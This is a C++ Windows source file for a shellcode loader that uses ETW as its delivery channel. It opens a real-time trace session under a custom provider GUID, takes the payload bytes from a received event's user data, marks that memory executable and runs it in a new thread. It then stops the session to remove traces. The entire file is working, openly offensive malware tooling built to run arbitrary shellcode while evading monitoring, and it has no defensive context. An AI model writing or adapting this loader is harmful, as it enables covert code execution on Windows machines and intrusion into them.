#include <windows.h>
#include <evntrace.h>    // ETW Tracing
#include <evntcons.h>    // ETW Consumers
#include <iostream>

#pragma comment(lib, "Advapi32.lib")

using namespace std;

// Unique GUID for our custom ETW Provider
static const GUID ProviderGuid = { 0xdeadc0de, 0x1337, 0x6969, { 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67, 0x89 } };

TRACEHANDLE hSession = 0;  // ETW Session Handle
TRACEHANDLE hTrace = 0;    // ETW Trace Handle

#ifndef PROCESS_TRACE_MODE_REAL_TIME
#define PROCESS_TRACE_MODE_REAL_TIME 0x00000100
#endif
#ifndef PROCESS_TRACE_MODE_EVENT_RECORD
#define PROCESS_TRACE_MODE_EVENT_RECORD 0x10000000
#endif

// Stop the ETW session to remove traces.
void CleanupETWSession() {
    cout << "[*] Cleaning up.\n";

    size_t bufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(L"ETWShellcodeLoaderSession");
    EVENT_TRACE_PROPERTIES* pSessionProperties = (EVENT_TRACE_PROPERTIES*)calloc(1, bufferSize);
    if (!pSessionProperties) {
        cerr << "[!] Failed to allocate memory for ETW session properties.\n";
    }
    pSessionProperties->Wnode.BufferSize = (ULONG)bufferSize;
    pSessionProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    pSessionProperties->Wnode.ClientContext = 1;
    pSessionProperties->Wnode.Guid = ProviderGuid;
    pSessionProperties->LogFileMode = EVENT_TRACE_REAL_TIME_MODE;
    pSessionProperties->MaximumFileSize = 0;
    pSessionProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    LPWSTR sessionName = (LPWSTR)((char*)pSessionProperties + pSessionProperties->LoggerNameOffset);
    wcscpy_s(sessionName, wcslen(L"ETWShellcodeLoaderSession") + 1, L"ETWShellcodeLoaderSession");

    ULONG status = QueryTrace(NULL, sessionName, pSessionProperties);
    if (status == ERROR_SUCCESS) {
        status = ControlTrace(hSession, sessionName, pSessionProperties, EVENT_TRACE_CONTROL_STOP);
        if (status == ERROR_SUCCESS) {
            cout << "[*] ETW session stopped & cleaned up.\n";
        }
        else {
            cerr << "[!] Failed to stop existing ETW session. Error: " << status << "\n";
            free(pSessionProperties);
        }
        Sleep(500);
    }
    else if (status == ERROR_WMI_INSTANCE_NOT_FOUND) {
        cout << "[+] No remaining ETW session found.\n";
    }
    else {
        cerr << "[!] QueryTrace failed. Error: " << status << "\n";
        free(pSessionProperties);
    }
}


// Callback function: when an ETW event is received, extract and execute shellcode.
void WINAPI EventCallback(PEVENT_RECORD pEvent) {
    if (!pEvent)
        return;

    cout << "[*] ETW event received!" << endl;

    if (memcmp(&pEvent->EventHeader.ProviderId, &ProviderGuid, sizeof(GUID)) == 0) {
        cout << "[+] Shellcode event detected. Extracting payload..." << endl;
        unsigned char* payload = (unsigned char*)pEvent->UserData;
        DWORD payloadSize = pEvent->UserDataLength;
        cout << "[*] Shellcode size: " << payloadSize << " bytes" << endl;

        LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!execMem) {
            cerr << "[!] VirtualAlloc failed. Error: " << GetLastError() << "\n";
            return;
        }
        CleanupETWSession();

        memcpy(execMem, payload, payloadSize);
        DWORD oldProtect;
        if (!VirtualProtect(execMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
            cerr << "[!] VirtualProtect failed. Error: " << GetLastError() << "\n";
            return;
        }
        cout << "[+] Shellcode copied to executable memory." << endl;

        cout << "[*] Executing shellcode..." << endl;
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
        if (hThread)
            CloseHandle(hThread);
    }
}

// Listener thread: opens the ETW session and processes events.
DWORD WINAPI ETWListenerThread(LPVOID lpParam) {
    EVENT_TRACE_LOGFILE logFile = { 0 };
    logFile.LoggerName = (LPWSTR)L"ETWShellcodeLoaderSession";
    logFile.ProcessTraceMode = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;
    logFile.EventRecordCallback = (PEVENT_RECORD_CALLBACK)EventCallback;

    hTrace = OpenTrace(&logFile);
    if (hTrace == INVALID_PROCESSTRACE_HANDLE) {
        cerr << "[!] OpenTrace failed. Error: " << GetLastError() << endl;
        return 1;
    }
    cout << "[*] Listening for ETW shellcode events..." << endl;
    ULONG status = ProcessTrace(&hTrace, 1, NULL, NULL);
    if (status != ERROR_SUCCESS) {
        cerr << "[!] ProcessTrace failed. Error: " << GetLastError() << endl;
        return 1;
    }
    return 0;
}

// Creates a new ETW session named "ETWShellcodeLoaderSession".
bool StartETWSession() {
    size_t bufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(L"ETWShellcodeLoaderSession");
    EVENT_TRACE_PROPERTIES* pSessionProperties = (EVENT_TRACE_PROPERTIES*)calloc(1, bufferSize);
    if (!pSessionProperties) {
        cerr << "[!] Failed to allocate memory for ETW session properties." << endl;
        return false;
    }
    pSessionProperties->Wnode.BufferSize = (ULONG)bufferSize;
    pSessionProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    pSessionProperties->Wnode.ClientContext = 1;
    pSessionProperties->LogFileMode = EVENT_TRACE_REAL_TIME_MODE;
    pSessionProperties->MaximumFileSize = 0;
    pSessionProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    LPWSTR sessionName = (LPWSTR)((char*)pSessionProperties + pSessionProperties->LoggerNameOffset);
    wcscpy_s(sessionName, wcslen(L"ETWShellcodeLoaderSession") + 1, L"ETWShellcodeLoaderSession");

    // Attempt to stop any existing session first.
    ULONG status = QueryTrace(NULL, sessionName, pSessionProperties);
    if (status == ERROR_SUCCESS) {
        cout << "[*] Existing ETW session found. Stopping it..." << endl;
        status = ControlTrace(hSession, sessionName, pSessionProperties, EVENT_TRACE_CONTROL_STOP);
        if (status != ERROR_SUCCESS) {
            cerr << "[!] Failed to stop existing ETW session. Error: " << status << endl;
            free(pSessionProperties);
            return false;
        }
        Sleep(500);
    }
    else if (status != ERROR_WMI_INSTANCE_NOT_FOUND) {
        cerr << "[!] QueryTrace failed. Error: " << status << endl;
        free(pSessionProperties);
        return false;
    }

    status = StartTrace(&hSession, sessionName, pSessionProperties);
    free(pSessionProperties);

    if (status == ERROR_ALREADY_EXISTS) {
        cout << "[*] ETW session already exists. Joining existing session." << endl;
        return true;
    }
    else if (status != ERROR_SUCCESS) {
        cerr << "[!] StartTrace failed. Error: " << status << endl;
        return false;
    }

    cout << "[+] ETW Session started successfully." << endl;

    status = EnableTraceEx2(
        hSession,
        &ProviderGuid,
        EVENT_CONTROL_CODE_ENABLE_PROVIDER,
        TRACE_LEVEL_VERBOSE,
        0, 0, 0, NULL
    );
    if (status != ERROR_SUCCESS) {
        cerr << "[!] EnableTraceEx2 failed. Error: " << status << endl;
    }
    else {
        cout << "[+] Provider enabled for the ETW session." << endl;
    }
    return true;
}

int main() {
    // Start the ETW session and listener.
    if (!StartETWSession())
        return 1;

    HANDLE hListenerThread = CreateThread(NULL, 0, ETWListenerThread, NULL, 0, NULL);
    if (!hListenerThread) {
        cerr << "[!] Failed to create ETW listener thread. Error: " << GetLastError() << endl;
        return 1;
    }

    // Wait for the listener thread to process the event.
    WaitForSingleObject(hListenerThread, INFINITE);

    // Keep the process running so that the shellcode thread remains active.
    Sleep(INFINITE);
    return 0;
}
